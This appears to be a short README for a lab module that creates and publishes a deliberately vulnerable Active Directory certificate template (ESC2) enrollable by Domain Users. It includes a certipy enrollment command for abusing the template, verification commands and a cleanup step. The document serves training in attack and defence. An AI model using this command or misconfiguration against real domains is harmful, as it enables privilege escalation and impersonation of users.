# esc2

Certificate template with the Any Purpose EKU, enrollable by Domain Users (ESC2). Creates and publishes `ESC2` on the CA of the target host's forest, enrollable by `<NB>\Domain Users`.

Attack:

    certipy req -u <user>@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -ca <NB>-CA -template ESC2
    # use the certificate as an enrollment agent (ESC3 step 2) or for client authentication

How to verify:

    certutil -catemplates | findstr ESC2
    certipy find -u <user>@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -vulnerable -stdout

Disable revokes every certificate issued from the template(s), unpublishes and deletes them.
